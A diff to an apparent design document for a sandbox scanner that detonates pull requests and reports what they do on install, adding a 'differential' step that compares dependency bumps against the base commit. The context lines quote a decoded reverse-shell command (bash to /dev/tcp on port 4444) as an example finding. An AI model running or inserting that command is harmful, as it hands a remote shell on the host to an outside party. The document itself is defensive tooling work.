@@ -76,6 +76,10 @@ flowchart LR
    (and, if that script ran a file from the PR, on the line there that spawned the payload).
    The model only adds a one-sentence "what it does", decoding obfuscation: for the E5
    reverse shell it decodes the base64 to `bash -i >& /dev/tcp/203.0.113.10/4444 0>&1`.
+9. **Differential**: for a dependency bump, the base commit is detonated too (cached) and the
+   report shows only the behavior the PR *introduced* ("new at install: a connect to
+   203.0.113.10:4444"). Low findings the old version already produced are suppressed, so
+   routine bumps stay quiet; high/critical are never suppressed.
 
 ## Why it's hard to fool
 
